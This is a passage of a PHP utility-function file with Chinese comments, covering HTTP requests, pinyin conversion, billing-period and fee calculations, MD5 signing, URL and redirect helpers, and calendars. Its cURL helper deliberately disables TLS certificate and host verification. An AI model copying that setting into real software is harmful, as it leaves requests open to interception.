        $ci = curl_init();
        /* Curl settings */
        curl_setopt($ci, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
        curl_setopt($ci, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0");
        curl_setopt($ci, CURLOPT_CONNECTTIMEOUT, 0); /* 在发起连接前等待的时间，如果设置为0，则无限等待 */
        curl_setopt($ci, CURLOPT_TIMEOUT, 0); /* 设置cURL允许执行的最长秒数 */
        curl_setopt($ci, CURLOPT_RETURNTRANSFER, true);
        switch ($method) {
            case "POST":
                curl_setopt($ci, CURLOPT_POST, true);
                if (!empty($postfields)) {
                    $tmpdatastr = is_array($postfields) ? http_build_query($postfields) : $postfields;
                    curl_setopt($ci, CURLOPT_POSTFIELDS, $tmpdatastr);
                }
                break;
            default:
                $method = 'GET';
                if (!empty($postfields)) {
                    $tmpdatastr = is_array($postfields) ? http_build_query($postfields) : $postfields;
                    $link = strpos($url, '?') === false ? '?' : '&';
                    $url = $url . $link . $tmpdatastr;
                }
                curl_setopt($ci, CURLOPT_CUSTOMREQUEST, $method); /* //设置请求方式 */
                break;
        }
        $ssl = preg_match('/^https:\/\//i', $url) ? TRUE : FALSE;
        curl_setopt($ci, CURLOPT_URL, $url);
        if ($ssl) {
            curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
            curl_setopt($ci, CURLOPT_SSL_VERIFYHOST, FALSE); // 不从证书中检查SSL加密算法是否存在
        }
        //curl_setopt($ci, CURLOPT_HEADER, true); /*启用时会将头文件的信息作为数据流输出*/
        curl_setopt($ci, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ci, CURLOPT_MAXREDIRS, 2);/*指定最多的HTTP重定向的数量，这个选项是和CURLOPT_FOLLOWLOCATION一起使用的*/
        curl_setopt($ci, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ci, CURLINFO_HEADER_OUT, true);
        /*curl_setopt($ci, CURLOPT_COOKIE, $Cookiestr); * *COOKIE带过去** */
        $response = curl_exec($ci);
        $requestinfo = curl_getinfo($ci);
        $http_code = curl_getinfo($ci, CURLINFO_HTTP_CODE);
        $curl_error = curl_errno($ci);
        if ($debug) {
            echo "=====post data======\r\n";
            var_dump($postfields);
            echo "=====info===== \r\n";
            print_r($requestinfo);
            echo "=====response=====\r\n";
            print_r($response);
        }
        curl_close($ci);
        $count++;
    } while ($count < 3 && $curl_error > 0);
    //return $response;
    logWrite("请求地址:{$url}");
    logWrite("请求参数:" . jsonEncode($postfields));
    logWrite("错误码:{$curl_error}");
    logWrite("返回结果：{$response}");
    return $response;
}

/**
 * 删除快速缓存的目录
 * @param string $path 一般为表名
 * User: hjun
 * Date: 2018-04-04 15:10:42
 * Update: 2018-04-04 15:10:42
 * Version: 1.00
 */
function DF($path = '')
{
    del_dir_file(DATA_PATH . $path . '/', true);
}

/**
 * 过滤null
 * @param $param mixed
 * @return string ['code'=>200, 'msg'=>'', 'data'=>null]
 * User: hjun
 * Date: 2018-04-10 14:31:57
 * Update: 2018-04-10 14:31:57
 * Version: 1.00
 */
function null2Empty($param)
{
    if (is_null($param)) {
        return '';
    }
    // 日期.格式转成-
    if (strpos($param, '.') !== false) {
        $arr = explode('.', $param);
        if (count($arr) == 3) {
            // 如果是日期 则每个值都一定是数值
            foreach ($arr as $val) {
                if (!is_numeric($val)) {
                    return $param;
                }
            }
            return implode('-', $arr);
        }
    }
    return $param;
}

/**
 * 中文转英文拼音
 * @param $_String
 * @param string $_Code
 * @return array ['code'=>200, 'msg'=>'', 'data'=>null]
 * User: hjun
 * Date: 2018-04-10 18:02:47
 * Update: 2018-04-10 18:02:47
 * Version: 1.00
 */
function pinyin($_String, $_Code = 'utf-8')
{
    $_DataKey = "a|ai|an|ang|ao|ba|bai|ban|bang|bao|bei|ben|beng|bi|bian|biao|bie|bin|bing|bo|bu|ca|cai|can|cang|cao|ce|ceng|cha" .
        "|chai|chan|chang|chao|che|chen|cheng|chi|chong|chou|chu|chuai|chuan|chuang|chui|chun|chuo|ci|cong|cou|cu|" .
        "cuan|cui|cun|cuo|da|dai|dan|dang|dao|de|deng|di|dian|diao|die|ding|diu|dong|dou|du|duan|dui|dun|duo|e|en|er" .
        "|fa|fan|fang|fei|fen|feng|fo|fou|fu|ga|gai|gan|gang|gao|ge|gei|gen|geng|gong|gou|gu|gua|guai|guan|guang|gui" .
        "|gun|guo|ha|hai|han|hang|hao|he|hei|hen|heng|hong|hou|hu|hua|huai|huan|huang|hui|hun|huo|ji|jia|jian|jiang" .
        "|jiao|jie|jin|jing|jiong|jiu|ju|juan|jue|jun|ka|kai|kan|kang|kao|ke|ken|keng|kong|kou|ku|kua|kuai|kuan|kuang" .
        "|kui|kun|kuo|la|lai|lan|lang|lao|le|lei|leng|li|lia|lian|liang|liao|lie|lin|ling|liu|long|lou|lu|lv|luan|lue" .
        "|lun|luo|ma|mai|man|mang|mao|me|mei|men|meng|mi|mian|miao|mie|min|ming|miu|mo|mou|mu|na|nai|nan|nang|nao|ne" .
        "|nei|nen|neng|ni|nian|niang|niao|nie|nin|ning|niu|nong|nu|nv|nuan|nue|nuo|o|ou|pa|pai|pan|pang|pao|pei|pen" .
        "|peng|pi|pian|piao|pie|pin|ping|po|pu|qi|qia|qian|qiang|qiao|qie|qin|qing|qiong|qiu|qu|quan|que|qun|ran|rang" .
        "|rao|re|ren|reng|ri|rong|rou|ru|ruan|rui|run|ruo|sa|sai|san|sang|sao|se|sen|seng|sha|shai|shan|shang|shao|" .
        "she|shen|sheng|shi|shou|shu|shua|shuai|shuan|shuang|shui|shun|shuo|si|song|sou|su|suan|sui|sun|suo|ta|tai|" .
        "tan|tang|tao|te|teng|ti|tian|tiao|tie|ting|tong|tou|tu|tuan|tui|tun|tuo|wa|wai|wan|wang|wei|wen|weng|wo|wu" .
        "|xi|xia|xian|xiang|xiao|xie|xin|xing|xiong|xiu|xu|xuan|xue|xun|ya|yan|yang|yao|ye|yi|yin|ying|yo|yong|you" .
        "|yu|yuan|yue|yun|za|zai|zan|zang|zao|ze|zei|zen|zeng|zha|zhai|zhan|zhang|zhao|zhe|zhen|zheng|zhi|zhong|" .
        "zhou|zhu|zhua|zhuai|zhuan|zhuang|zhui|zhun|zhuo|zi|zong|zou|zu|zuan|zui|zun|zuo";
    $_DataValue = "-20319|-20317|-20304|-20295|-20292|-20283|-20265|-20257|-20242|-20230|-20051|-20036|-20032|-20026|-20002|-19990" .
        "|-19986|-19982|-19976|-19805|-19784|-19775|-19774|-19763|-19756|-19751|-19746|-19741|-19739|-19728|-19725" .
        "|-19715|-19540|-19531|-19525|-19515|-19500|-19484|-19479|-19467|-19289|-19288|-19281|-19275|-19270|-19263" .
        "|-19261|-19249|-19243|-19242|-19238|-19235|-19227|-19224|-19218|-19212|-19038|-19023|-19018|-19006|-19003" .
        "|-18996|-18977|-18961|-18952|-18783|-18774|-18773|-18763|-18756|-18741|-18735|-18731|-18722|-18710|-18697" .
        "|-18696|-18526|-18518|-18501|-18490|-18478|-18463|-18448|-18447|-18446|-18239|-18237|-18231|-18220|-18211" .
        "|-18201|-18184|-18183|-18181|-18012|-17997|-17988|-17970|-17964|-17961|-17950|-17947|-17931|-17928|-17922" .
        "|-17759|-17752|-17733|-17730|-17721|-17703|-17701|-17697|-17692|-17683|-17676|-17496|-17487|-17482|-17468" .
        "|-17454|-17433|-17427|-17417|-17202|-17185|-16983|-16970|-16942|-16915|-16733|-16708|-16706|-16689|-16664" .
        "|-16657|-16647|-16474|-16470|-16465|-16459|-16452|-16448|-16433|-16429|-16427|-16423|-16419|-16412|-16407" .
        "|-16403|-16401|-16393|-16220|-16216|-16212|-16205|-16202|-16187|-16180|-16171|-16169|-16158|-16155|-15959" .
        "|-15958|-15944|-15933|-15920|-15915|-15903|-15889|-15878|-15707|-15701|-15681|-15667|-15661|-15659|-15652" .
        "|-15640|-15631|-15625|-15454|-15448|-15436|-15435|-15419|-15416|-15408|-15394|-15385|-15377|-15375|-15369" .
        "|-15363|-15362|-15183|-15180|-15165|-15158|-15153|-15150|-15149|-15144|-15143|-15141|-15140|-15139|-15128" .
        "|-15121|-15119|-15117|-15110|-15109|-14941|-14937|-14933|-14930|-14929|-14928|-14926|-14922|-14921|-14914" .
        "|-14908|-14902|-14894|-14889|-14882|-14873|-14871|-14857|-14678|-14674|-14670|-14668|-14663|-14654|-14645" .
        "|-14630|-14594|-14429|-14407|-14399|-14384|-14379|-14368|-14355|-14353|-14345|-14170|-14159|-14151|-14149" .
        "|-14145|-14140|-14137|-14135|-14125|-14123|-14122|-14112|-14109|-14099|-14097|-14094|-14092|-14090|-14087" .
        "|-14083|-13917|-13914|-13910|-13907|-13906|-13905|-13896|-13894|-13878|-13870|-13859|-13847|-13831|-13658" .
        "|-13611|-13601|-13406|-13404|-13400|-13398|-13395|-13391|-13387|-13383|-13367|-13359|-13356|-13343|-13340" .
        "|-13329|-13326|-13318|-13147|-13138|-13120|-13107|-13096|-13095|-13091|-13076|-13068|-13063|-13060|-12888" .
        "|-12875|-12871|-12860|-12858|-12852|-12849|-12838|-12831|-12829|-12812|-12802|-12607|-12597|-12594|-12585" .
        "|-12556|-12359|-12346|-12320|-12300|-12120|-12099|-12089|-12074|-12067|-12058|-12039|-11867|-11861|-11847" .
        "|-11831|-11798|-11781|-11604|-11589|-11536|-11358|-11340|-11339|-11324|-11303|-11097|-11077|-11067|-11055" .
        "|-11052|-11045|-11041|-11038|-11024|-11020|-11019|-11018|-11014|-10838|-10832|-10815|-10800|-10790|-10780" .
        "|-10764|-10587|-10544|-10533|-10519|-10331|-10329|-10328|-10322|-10315|-10309|-10307|-10296|-10281|-10274" .
        "|-10270|-10262|-10260|-10256|-10254";
    $_TDataKey = explode('|', $_DataKey);
    $_TDataValue = explode('|', $_DataValue);
    $_Data = (PHP_VERSION >= '5.0') ? array_combine($_TDataKey, $_TDataValue) : _Array_Combine($_TDataKey, $_TDataValue);
    arsort($_Data);
    reset($_Data);
    if ($_Code != 'gb2312') $_String = _U2_Utf8_Gb($_String);
    $_Res = '';
    for ($i = 0; $i < strlen($_String); $i++) {
        $_P = ord(substr($_String, $i, 1));
        if ($_P > 160) {
            $_Q = ord(substr($_String, ++$i, 1));
            $_P = $_P * 256 + $_Q - 65536;
        }
        $_Res .= _Pinyin($_P, $_Data);
    }
    return preg_replace("/[^a-z0-9]*/", '', $_Res);
}

function _Pinyin($_Num, $_Data)
{
    if ($_Num > 0 && $_Num < 160) return chr($_Num);
    elseif ($_Num < -20319 || $_Num > -10247) return '';
    else {
        foreach ($_Data as $k => $v) {
            if ($v <= $_Num) break;
        }
        return $k;
    }
}

function _U2_Utf8_Gb($_C)
{
    $_String = '';
    if ($_C < 0x80) $_String .= $_C;
    elseif ($_C < 0x800) {
        $_String .= chr(0xC0 | $_C >> 6);
        $_String .= chr(0x80 | $_C & 0x3F);
    } elseif ($_C < 0x10000) {
        $_String .= chr(0xE0 | $_C >> 12);
        $_String .= chr(0x80 | $_C >> 6 & 0x3F);
        $_String .= chr(0x80 | $_C & 0x3F);
    } elseif ($_C < 0x200000) {
        $_String .= chr(0xF0 | $_C >> 18);
        $_String .= chr(0x80 | $_C >> 12 & 0x3F);
        $_String .= chr(0x80 | $_C >> 6 & 0x3F);
        $_String .= chr(0x80 | $_C & 0x3F);
    }
    return iconv('UTF-8', 'GB2312', $_String);
}

function _Array_Combine($_Arr1, $_Arr2)
{
    for ($i = 0; $i < count($_Arr1); $i++) $_Res[$_Arr1[$i]] = $_Arr2[$i];
    return $_Res;
}

/**
 * 获取范围的搜索条件
 * @param array $req
 * @param string $reqKeyMin 搜索最小值
 * @param string $reqKeyMax 搜索最大值
 * @param string $error 错误提示
 * @param int $needForwardDay 是否需要向前推一天
 * @return array ['code'=>200, 'msg'=>'', 'data'=>null]
 * User: hjun
 * Date: 2018-04-16 11:33:48
 * Update: 2018-04-16 11:33:48
 * Version: 1.00
 */
function getRangeWhere($req = [], $reqKeyMin = 'min', $reqKeyMax = 'max', $error = '范围不正确', $needForwardDay = 0)
{
    if (date('Y-m-d', strtotime($req[$reqKeyMin])) === $req[$reqKeyMin] ||
        date('Y-m-d', strtotime($req[$reqKeyMax])) === $req[$reqKeyMax] ||
        date('Y-m-d H:i', strtotime($req[$reqKeyMin])) === $req[$reqKeyMin] ||
        date('Y-m-d H:i', strtotime($req[$reqKeyMax])) === $req[$reqKeyMax] ||
        date('Y-m-d H:i:s', strtotime($req[$reqKeyMin])) === $req[$reqKeyMin] ||
        date('Y-m-d H:i:s', strtotime($req[$reqKeyMax])) === $req[$reqKeyMax]) {
        // 如果日期格式正常 转为时间戳
        $min = strtotime($req[$reqKeyMin]);
        if ($needForwardDay == 1) {
            $max = strtotime($req[$reqKeyMax]);
            $max += 3600 * 24 - 1;
        } else {
            $max = strtotime($req[$reqKeyMax]);
        }
    } else {
        // 其他情况 用原始值
        $min = $req[$reqKeyMin];
        if ($needForwardDay == 1) {
            $max = strtotime('+1 day', strtotime($req[$reqKeyMax]));
            $max -= 1;
            if (date('Y-m-d', strtotime($req[$reqKeyMax])) === $req[$reqKeyMax]) {
                $max = date('Y-m-d', $max);
            } elseif (date('Y-m-d H:i', strtotime($req[$reqKeyMax])) === $req[$reqKeyMax]) {
                $max = date('Y-m-d H:i', $max);
            } else {
                $max = date('Y-m-d H:i:s', $max);
            }
        } else {
            $max = $req[$reqKeyMax];
        }
    }
    // 抓换时间失败则不转换 默认转换时间
    if (!empty($req[$reqKeyMin]) && empty($req[$reqKeyMax])) {
        $where = ['egt', $min];
    } elseif (empty($req[$reqKeyMin]) && !empty($req[$reqKeyMax])) {
        $where = ['elt', $max];
    } elseif (!empty($req[$reqKeyMin]) && !empty($req[$reqKeyMax])) {
        if ($min > $max) {
            return (getReturn(CODE_ERROR, $error));
        }
        $where = ['between', "{$min},{$max}"];
    } else {
        $where = [];
    }
    return getReturn(CODE_SUCCESS, 'success', $where);
}


/**
 * 计算两个时间戳相差多少个月多少天
 * @param int $startTime 开始时间戳
 * @param int $endTime 结束时间戳
 * @return array
 * User: hjun
 * Date: 2018-04-20 17:03:19
 * Update: 2018-04-20 17:03:19
 * Version: 1.00
 */
function getDiffDate($startTime = 0, $endTime = 0)
{
    $startTime = strtotime(date('Y-m-d', $startTime));
    $endTime = strtotime(date('Y-m-d', $endTime));
    // 循环进行分段 这里都默认1个月为周期 分完之后再根据period进行合并 直到结束时间为止
    $i = 1;
    $days = 0;
    $list = [];
    do {
        $item['start_time'] = $i == 1 ? $startTime : $list[$i - 2]['end_time'] + 3600 * 24;
        $item['end_time'] = (getNextPeriodDate($startTime, $i * 1) - 3600 * 24);
        if ($item['end_time'] > $endTime) {
            $item['end_time'] = $endTime;
            $i--;
            $days = getDaysByStartAndEnd($item['start_time'], $item['end_time']);
        }
        $list[] = $item;
        $i++;
    } while ($item['end_time'] < $endTime);
    $data = [];
    $data['months'] = ($i - 1) * 1;
    $data['days'] = $days < 0 ? 0 : $days;
    return $data;
}

/**
 * 获取两个日期之间相差时间的字符串
 * @param int $startTime 开始时间
 * @param int $endTime 结束时间
 * @return string 返回格式: x月y天
 * User: hjun
 * Date: 2018-04-23 23:11:47
 * Update: 2018-04-23 23:11:47
 * Version: 1.00
 */
function getDiffDateString($startTime = 0, $endTime = 0)
{
    $diff = getDiffDate($startTime, $endTime);
    return "{$diff['months']}个月{$diff['days']}天";
}

/**
 * 获取两个时间之间相差的天数
 * @param int $startTime 开始时间戳
 * @param int $endTime 结束时间戳
 * @return int 返回相差的天数
 * User: hjun
 * Date: 2018-04-23 14:15:20
 * Update: 2018-04-23 14:15:20
 * Version: 1.00
 */
function getDaysByStartAndEnd($startTime = 0, $endTime = 0)
{
    if ($startTime > $endTime) return 0;
    $oneDay = 3600 * 24;
    $startTime = strtotime(date('Y-m-d', $startTime));
    $endTime = strtotime(date('Y-m-d', $endTime));
    return (($endTime - $startTime + $oneDay) / $oneDay);
}

/**
 * 获取日期的下个周期的日期
 * @param int $time 日期时间戳
 * @param int $period 周期 月份数
 * @param int $initTime 初始日期的时间戳 假设初始日期为29号,则下个周期的日期也一定要为29号
 * @return int
 * User: hjun
 * Date: 2018-04-22 23:23:36
 * Update: 2018-04-22 23:23:36
 * Version: 1.00
 */
function getNextPeriodDate($time = NOW_TIME, $period = 1, $initTime = null)
{
    // 基础判断
    if (empty($period)) return $time;
    $date = date('Y-m-d', $time);
    if (empty($date)) return 0;
    // 初始日期小于等于当前进行计算的时间才有效
    if (isset($initTime) && $initTime <= $time) {
        $initDay = date('d', $initTime);
    }

    // 用字符串做周期加法,如果超过12个月,则年份要进位
    list($year, $month, $day) = explode('-', $date);
    $func = $period > 0 ? 'floor' : 'ceil';
    $yearDiff = $func($period / 12);
    $nextYear = $year + $yearDiff;
    $nextMonth = $month + $period % 12;
    $nextDay = isset($initDay) ? $initDay : $day;

    // 如果月数超过了12
    if ($nextMonth > 12) {
        $nextMonth = $nextMonth - 12;
        $nextYear++;
    } elseif ($nextMonth < 0) {
        $nextMonth = $nextMonth + 12;
        $nextYear--;
    }

    // 如果下个周期对应的日期超过了下个周期月份的实际天数 则日期为实际天数
    $nextMonthDays = date('t', strtotime("{$nextYear}-{$nextMonth}"));
    // 如果当前日期为月末 则下个周期对应的日期也要为月末 （该判断移除,遵循initDay规则即可）
//    $currentMonthDays = date('t', strtotime("{$year}-{$month}"));
    if ($nextMonthDays < $nextDay) {
        $nextDay = $nextMonthDays;
    }
    $nextTime = strtotime("{$nextYear}-{$nextMonth}-{$nextDay}");
    return $nextTime;
}

/**
 * 根据支付周期方式获取实际的周期月数
 * @param int $payType 支付方式
 * @return int 返回对应的月数
 * User: hjun
 * Date: 2018-04-22 17:17:11
 * Update: 2018-04-22 17:17:11
 * Version: 1.00
 */
function getPayTypePeriod($payType = 0)
{
    $model = D('Contract');
    switch ((int)$payType) {
        case $model::PAY_TYPE_MONTH:
            $period = 1;
            break;
        case $model::PAY_TYPE_QUARTER:
            $period = 3;
            break;
        case $model::PAY_TYPE_HALF_YEAR:
            $period = 6;
            break;
        case $model::PAY_TYPE_YEAR:
            $period = 12;
            break;
        default:
            $period = 1;
            break;
    }
    return $period;
}

/**
 * 获取两个日期之间的总额 相差的时长不能超过1个月
 * 同时每个月都按照有30天来计算 防止误差
 * @param int $startTime 开始时间
 * @param int $endTime 结束时间
 * @param float $avgFee 平均费用
 * @return double
 * User: hjun
 * Date: 2018-04-24 02:59:38
 * Update: 2018-04-24 02:59:38
 * Version: 1.00
 */
function getTotalFeeByStartAndEnd($startTime = 0, $endTime = 0, $avgFee = 0.00)
{
    $avgFee = abs($avgFee);
    list($y1, $m1, $d1) = explode('-', date('Y-m-d', $startTime));
    list($y2, $m2, $d2) = explode('-', date('Y-m-d', $endTime));
    $mDays = 30;
    if ($y1 == $y2 && $m1 == $m2) {
        // 如果开始时间和结束时间都是31号 按规则30天一个月 31号是多出来的一天 不算钱
        if ($d1 == '31' && $d2 == '31') {
            return 0;
        }
        // 如果d2是月末 则按30计算
        $m2Days = date('t', strtotime("{$y2}-{$m2}"));
        if ($d2 == $m2Days) {
            $d2 = 30;
        }
        // 如果是同年同月 则获取当月的日费用
        return (($avgFee * ($d2 - $d1 + 1)) / $mDays);
    } else {
        // 不同年或者不同月 则将时间分为两段 分别计算两个月的均值
        if ($d1 == '31') {
            // 31号不算钱
            $fee1 = 0;
        } else {
            // 都按30天来算
            $fee1 = (($avgFee * (30 - $d1 + 1)) / $mDays);
        }
        $fee2 = (($avgFee * $d2) / $mDays);
        return $fee1 + $fee2;
    }
}

/**
 * 将源数组的某些值合并到目标数组中
 * @param array $obj 目标数组
 * @param array $src 源数组
 * @param array $keys
 * User: hjun
 * Date: 2018-04-23 10:31:50
 * Update: 2018-04-23 10:31:50
 * Version: 1.00
 */
function mergeArray(&$obj = [], $src = [], $keys = [])
{
    foreach ($keys as $field) {
        if (isset($src[$field])) {
            $obj[$field] = $src[$field];
        }
    }
}

/**
 * 根据映射合并数组
 * @param array $subject
 * @param array $src
 * @param array $map
 * User: hjun
 * Date: 2018-05-10 11:50:14
 * Update: 2018-05-10 11:50:14
 * Version: 1.00
 */
function mergeArrayByMap(&$subject = [], $src = [], $map = [])
{
    foreach ($map as $subField => $srcField) {
        $key = is_string($subField) ? $subField : $srcField;
        if (isset($src[$srcField])) {
            $subject[$key] = $src[$srcField];
        }
    }
}


/**
 * 生成签名
 * @return 签名，本函数不覆盖sign成员变量，如要设置签名需要调用SetSign方法赋值
 */
function MakeSign($params)
{
    //签名步骤一：按字典序排序参数
    ksort($params);
    $string = ToUrlParams($params);
    //签名步骤二：在string后加入KEY
    $string = $string . "&key=" . C('SIGN_KEY');
    //签名步骤三：MD5加密
    $string = md5($string);

    //签名步骤四：所有字符转为大写
    $result = strtoupper($string);
    return $result;
}

/**
 * 格式化参数格式化成url参数
 */
function ToUrlParams($params)
{
    $buff = "";
    foreach ($params as $k => $v) {
        if ($k != "sign" && $v !== "" && !is_array($v)) {
            $buff .= $k . "=" . $v . "&";
        }
    }
    $buff = trim($buff, "&");
    return $buff;
}

/**
 * 实例化逻辑层的简写
 * @param string $name
 * @return array ['code'=>200, 'msg'=>'', 'data'=>null]
 * User: hjun
 * Date: 2018-04-25 14:16:04
 * Update: 2018-04-25 14:16:04
 * Version: 1.00
 */
function DLO($name = '')
{
    return D($name, 'Logic');
}

/**
 * 实例化服务层的简写
 * @param string $name
 * @return array ['code'=>200, 'msg'=>'', 'data'=>null]
 * User: hjun
 * Date: 2018-04-25 14:16:41
 * Update: 2018-04-25 14:16:41
 * Version: 1.00
 */
function DS($name = '')
{
    return D($name, 'Service');
}

/**
 * 获取主机地址
 * @return string
 * User: hjun
 * Date: 2018-04-26 17:06:58
 * Update: 2018-04-26 17:06:58
 * Version: 1.00
 */
function getHostUrl()
{
    return is_ssl() ? "https://{$_SERVER['HTTP_HOST']}" : "http://{$_SERVER['HTTP_HOST']}";
}

/**
 * 是否为微信登陆
 * @return bool
 * User: czx
 * Date: 2018/4/26 11:25:39
 * Update: 2018/4/26 11:25:39
 * Version: 1.00
 */
function is_weixin()
{
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false) {
        return true;
    }
    return false;
}


/**
 * 判断地区是否存在
 * @param int $regionId
 * @return boolean
 * User: hjun
 * Date: 2018-04-28 10:02:10
 * Update: 2018-04-28 10:02:10
 * Version: 1.00
 */
function isRegionExist($regionId = 0)
{
    return D('Area')->isRegionExist($regionId);
}

/**
 * 根据地区ID获取地区名称
 * @param int $regionId
 * @return array ['code'=>200, 'msg'=>'', 'data'=>null]
 * User: hjun
 * Date: 2018-04-28 10:03:53
 * Update: 2018-04-28 10:03:53
 * Version: 1.00
 */
function getRegionNameById($regionId = 0)
{
    return D('Area')->getNameById($regionId);
}


/**
 * 将数据解析成数组
 * @param string $data
 * @return array
 * User: hjun
 * Date: 2018-05-03 10:32:45
 * Update: 2018-05-03 10:32:45
 * Version: 1.00
 */
function jsonDecodeToArr($data = '')
{
    $data = json_decode($data, 1);
    return empty($data) ? [] : $data;
}

/**
 * 将数据解析成对象
 * @param string $data
 * @return object
 * User: hjun
 * Date: 2018-05-03 10:33:28
 * Update: 2018-05-03 10:33:28
 * Version: 1.00
 */
function jsonDecodeToObject($data = '')
{
    $data = json_decode($data, 1);
    return empty($data) ? (object)[] : $data;
}


/**
 * 导出
 * @param $fileName
 * @param $headArr
 * @param $data
 * User: hjun
 * Date: 2018-05-15 15:40:57
 * Update: 2018-05-15 15:40:57
 * Version: 1.00
 */
function getExcel($fileName, $headArr, $data)
{
    $excel = new \Common\Util\Excel();
    $excel->setHeader($headArr);
    $excel->setExportList($data);
    $excel->setFileName($fileName);
    $excel->export();
}


/**
 * 获取随机的编号
 * @param string $prefix 前缀
 * @return string
 * User: hjun
 * Date: 2018-05-13 16:35:44
 * Update: 2018-05-13 16:35:44
 * Version: 1.00
 */
function getRandSnByPrefix($prefix = '')
{
    return $prefix . \Org\Util\TPString::randString(6, 1);
}

/**
 * 检查时间的有效性
 * @param string $time
 * @return boolean
 * User: hjun
 * Date: 2018-05-13 16:51:42
 * Update: 2018-05-13 16:51:42
 * Version: 1.00
 */
function isTimeActive($time = '')
{
    $timestamp = strtotime($time);
    return $timestamp !== false;
}

/**
 * 检查开始时间和结束时间
 * @param array $data
 * @return bool
 * User: hjun
 * Date: 2018-05-13 16:53:52
 * Update: 2018-05-13 16:53:52
 * Version: 1.00
 */
function checkStartAndEndTime($data = [])
{
    $start = str_to_time($data['start_time']);
    $end = str_to_time($data['end_time']);
    $start = empty($start) ? 0 : $start;
    $end = empty($end) ? 0 : $end;
    return $start <= $end;
}


/**
 * 判断操作是否成功
 * @param $result
 * @return bool
 * User: hjun
 * Date: 2018-05-14 10:47:13
 * Update: 2018-05-14 10:47:13
 * Version: 1.00
 */
function isSuccess($result)
{
    return $result['code'] === CODE_SUCCESS;
}


/**
 * URL封装函数
 * @param string $uri
 * @param string $domain
 * @return string
 * User: hjun
 * Date: 2018-05-17 08:52:05
 * Update: 2018-05-17 08:52:05
 * Version: 1.00
 */
function URL($uri = '', $domain = '')
{
    if (empty($domain)) {
        $domain = $_SERVER["HTTP_HOST"];
    }

    if ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) {
        return 'https://' . $domain . $uri;
    } else {
        return 'http://' . $domain . $uri;
    }
}

/**
 * 获取当前URL链接
 * @return string
 * User: hjun
 * Date: 2018-05-17 09:26:49
 * Update: 2018-05-17 09:26:49
 * Version: 1.00
 */
function getCurPageURL()
{
    return URL($_SERVER["REQUEST_URI"]);
}

/**
 * 跳转
 * @param string $url
 * @param int $time
 * User: hjun
 * Date: 2018-05-17 09:27:37
 * Update: 2018-05-17 09:27:37
 * Version: 1.00
 */
function jump($url = '', $time = 0)
{
    if (empty($url)) $url = getCurPageURL();
    if ($time || headers_sent()) {
        header('location:' . $url);
    } else {
        header('location:' . $url);
    }
    exit;
}

/**
 * 根据账单获取时间对应的月历
 * @param int $time 时间
 * @param array $todoDays 标记的日期
 * @return array
 * User: hjun
 * Date: 2018-05-18 17:46:38
 * Update: 2018-05-18 17:46:38
 * Version: 1.00
 */
function getCalendar($time = NOW_TIME, $todoDays = [])
{
    $start_time = strtotime(date('Y-m-1', $time));
    $start_week = date('w', $start_time);
    $total_month_day = date('t', $start_time);

    $weeks_in_month = ceil(($start_week + $total_month_day) / 7);

    $month_day_arr = [];
    $start_month_day = 1;
    $timeDay = date('d', $time);
    for ($i = 0; $i < $weeks_in_month; $i++) {

        for ($j = 0; $j < 7; $j++) {
            $obj = [
                'day_number' => $start_month_day,
                'has_todos' => in_array($start_month_day, $todoDays),
                'is_today' => $start_month_day == $timeDay
            ];
            if ($i == 0 && $j >= $start_week) {
                $month_day_arr[$i][$j] = $obj;
                $start_month_day++;
            } elseif ($i == 0) {
                $month_day_arr[$i][$j] = [
                    'day_number' => '',
                    'has_todos' => false,
                    'is_today' => false
                ];;
            } else {
                $month_day_arr[$i][$j] = $obj;
                $start_month_day++;
            }

            if ($start_month_day > $total_month_day) {
                break;
            }
        }
    }

    return $month_day_arr;
}

/**
 * 获取时间的月份周期
 * @param $timestamp
 * @param string type
 * @return array
 * User: hjun
 * Date: 2018-05-18 17:54:19
 * Update: 2018-05-18 17:54:19
 * Version: 1.00
 */
function getMonthRange($timestamp = NOW_TIME, $type = '')
{
    $monthFirstDay = date('Y-m-1 00:00:00', $timestamp);
    $mdays = date('t', $timestamp);
    $monthLastDay = date('Y-m-' . $mdays . ' 23:59:59', $timestamp);
    if ($type == 'str') {
        return [$monthFirstDay, $monthLastDay];
    } else {
        return [strtotime($monthFirstDay), strtotime($monthLastDay)];
    }
}

/**
 * 获取时间的日周期
 * @param $timestamp
 * @param string $type
 * @return array
 * User: hjun
 * Date: 2018-05-19 22:29:58
 * Update: 2018-05-19 22:29:58
 * Version: 1.00
 */
function getDayRange($timestamp = NOW_TIME, $type = '')
{
    $nowDay = date('Y-m-d', $timestamp);
    $start = strtotime($nowDay);
    $end = strtotime("{$nowDay} 23:59:59");
    if ($type == 'str') {
        return ["{$nowDay} 00:00:00", "{$nowDay} 23:59:59"];
    } else {
        return [$start, $end];
    }
}

/**
 * json序列化
 * @param $param
 * @return string
 * User: hjun
 * Date: 2018-08-22 15:05:55
 * Update: 2018-08-22 15:05:55
 * Version: 1.00
 */
function jsonEncode($param)
{
    if (empty($param)) return '';
    $data = json_encode($param, 256);
    if ($data === 'null' || $data === '[]' || $data === '{}') {
        return '';
    }
    return $data;
}

/**
 * 将列表按照某个值分组
 * @param array $list
 * @param string $key
 * @param string $childKeys
 * @return array
 * User: hjun
 * Date: 2018-05-23 16:03:06
 * Update: 2018-05-23 16:03:06
 * Version: 1.00
 */
function groupListByKey($list = [], $key = 'id', $childKeys = 'child')
{
    $new = [];
    foreach ($list as $value) {
        if (!isset($new[$value[$key]])) {
            $new[$value[$key]] = $value;
            $new[$value[$key]][$childKeys] = [];
        }
        $new[$value[$key]][$childKeys][] = $value;
    }
    return refreshArr($new);
}


/**
 * 同步更新名称字段
 * @param array $options
 * @return boolean
 * User: hjun
 * Date: 2018-07-12 15:09:38
 * Update: 2018-07-12 15:09:38
 * Version: 1.00
 */
function syncUpdateName($options = [])
{
    if (isset($options['where'])) {
        $where = $options['where'];
    } else {
        $where = [];
        $where[$options['id_key']] = $options['id'];
        $where['is_delete'] = NOT_DELETED;
    }
    if (isset($options['data'])) {
        $data = $options['data'];
    } else {
        $data = [];
